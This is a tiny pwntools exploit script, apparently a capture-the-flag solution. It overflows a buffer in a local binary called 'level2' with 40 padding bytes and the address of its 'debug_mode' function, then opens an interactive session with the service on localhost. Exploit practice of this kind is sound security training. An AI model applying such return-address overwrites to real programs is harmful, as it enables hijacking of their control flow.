#!/usr/bin/env python2
from pwn import *

elf = ELF("./level2")

def loc():
    return process("./level2")

def rem():
    return remote("127.0.0.1", 10002)

r = rem()
r.sendline("A" * 40 + p64(elf.symbols["debug_mode"]))
r.interactive()